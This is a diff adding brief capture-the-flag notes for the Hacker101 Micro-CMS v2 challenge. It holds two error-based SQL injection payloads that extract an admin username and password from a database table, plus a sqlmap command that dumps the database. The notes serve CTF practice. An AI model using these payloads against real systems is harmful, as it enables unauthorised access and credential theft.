@@ -5,3 +5,19 @@ pass for password
 
 ###: curl the changelog edit URL
 curl -X POST
+
+
+Micro-CMS v2 Double Query Injection
+
+For username:
+
+username=' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.username as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+
+For password:
+
+username=' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
+
+
+sqlmap -u https://<subdomain>.ctf.hacker101.com/login --data "username=abc&password=xyz" -p username --dbms=mysql --dump
+
+https://bernardoamc.com/
